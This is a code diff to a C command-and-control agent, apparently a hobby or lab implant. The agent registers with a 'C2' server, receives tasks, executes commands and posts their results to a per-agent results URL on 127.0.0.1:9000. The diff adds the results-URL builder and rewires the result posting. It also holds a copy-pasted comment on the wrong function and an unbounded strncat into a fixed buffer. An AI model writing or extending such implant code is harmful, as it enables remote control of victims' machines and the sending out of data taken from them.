@@ -123,6 +123,9 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
 	return realsize;
 }
 
+// Parses UUID from C2 registration response and concatenates to base tasks URL
+// to create complete tasks URL. Assigns URL value to corresponding field in
+// the agent_info struct.
 void create_tasks_url(char *response, struct agent_info *agent)
 {
 	char *ret;
@@ -140,10 +143,25 @@ void create_tasks_url(char *response, struct agent_info *agent)
 	// Copy URL to agent->tasks_url.
 	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
 	printf("Tasks URL is: %s", agent->tasks_url);
-	agent->got_tasks_url = true;
 
 	// Registration response is no longer needed. Free memory.
     free(response);
+
+}
+
+// Parses UUID from C2 registration response and concatenates to base tasks URL
+// to create complete tasks URL. Assigns URL value to corresponding field in
+// the agent_info struct.
+void create_results_url(struct agent_info *agent, struct tasks *task)
+{
+	// Concat agent UUID to results URL.
+	// Results base URL
+	char res_url[64] = "127.0.0.1:9000/results/";
+	strncat(res_url, agent->uuid, strlen(agent->uuid));
+
+	// Copy URL to agent->results_url.
+	strncpy(task->results_url, res_url, strlen(res_url) +1);
+	printf("Results URL is: %s", task->results_url);
 
 }
 
@@ -307,6 +325,7 @@ bool exec_cmd(struct tasks *task)
 	return true;
 }
 
+// Posts task results to C2 server.
 bool post_results(struct tasks *task)
 {
 	struct strings_array chunk = {.response = malloc(0), .size = 0};
@@ -319,16 +338,15 @@ bool post_results(struct tasks *task)
 	}
 
 	add_curl_field(web.form, "task id", "1234");
-
 	add_curl_field(web.form, "task results", task->results);
-
-	// Add submit options to curl field data.
 	add_curl_field(web.form, "submit", "send");
 
-	// Registration URL
-	const char resurl[27] = "127.0.0.1:9000/results/uuid";
+	// // Registration URL
+	// const char resurl[27] = "127.0.0.1:9000/results/uuid";
 
-	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);
+	curl_easy_setopt(web.curl, CURLOPT_URL, task->results_url);
+	puts("********************************");
+	printf("The tasks results url is %s\n", task->results_url);
 
 	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);
 
@@ -361,9 +379,7 @@ bool post_results(struct tasks *task)
 	return true;
 }
 
-
-
-
+// Frees memory for task array of strings.
 void destroy(struct tasks *task)
 {
 	/* Iterates through array elements and frees memory of each line in words
@@ -377,6 +393,7 @@ void destroy(struct tasks *task)
 	free(task->tasks_array);
 }
 
+// Sets task struct values to zero.
 void reset_task_vals(struct tasks *task)
 {
 
@@ -388,7 +405,7 @@ void reset_task_vals(struct tasks *task)
 }
 
 //ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
-// converts char* to file*.
+// Converts data from *char type to FILE type.
 FILE *char_to_file(char *data) {
 
     int len;
